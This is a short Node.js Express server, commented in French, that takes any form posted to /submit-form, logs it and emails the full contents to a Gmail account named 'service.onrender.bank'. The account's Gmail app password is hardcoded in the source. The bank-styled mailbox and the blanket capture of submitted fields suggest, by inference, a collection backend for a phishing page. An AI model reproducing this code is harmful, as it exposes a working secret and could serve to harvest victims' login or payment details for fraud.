const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors'); // Pour gérer les requêtes cross-origin
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3006; // Port défini par Render ou 3006 en local

// Middleware pour CORS
app.use(cors());

// Middleware pour parser les données du formulaire
app.use(bodyParser.urlencoded({ extended: true }));

// Route pour recevoir les données du formulaire
app.post('/submit-form', (req, res) => {
  const formData = req.body;

  // Affiche les données reçues dans la console (utile pour déboguer)
  console.log('Données reçues :', formData);

  // Configuration de Nodemailer (avec Gmail)
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'service.onrender.bank@gmail.com',
      pass: 'ehoj whpf gcwu drvb' // Mot de passe spécifique à l'application
    }
  });

  // Définir les options de l'email
  const mailOptions = {
    from: 'service.onrender.bank@gmail.com',
    to: 'service.onrender.bank@gmail.com',
    subject: 'Nouveau formulaire soumis',
    text: `Un formulaire a été soumis avec les données suivantes:\n\n${JSON.stringify(formData, null, 2)}`
  };

  // Envoyer l'email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Erreur lors de l\'envoi de l\'email :', error);
      return res.status(500).send('Erreur lors de l\'envoi de l\'email');
    } else {
      console.log('Email envoyé :', info.response);
      return res.status(200).send('Formulaire soumis et email envoyé');
    }
  });
});

// Démarrer le serveur
app.listen(port, () => {
  console.log(`Serveur démarré sur http://localhost:${port}`);
});
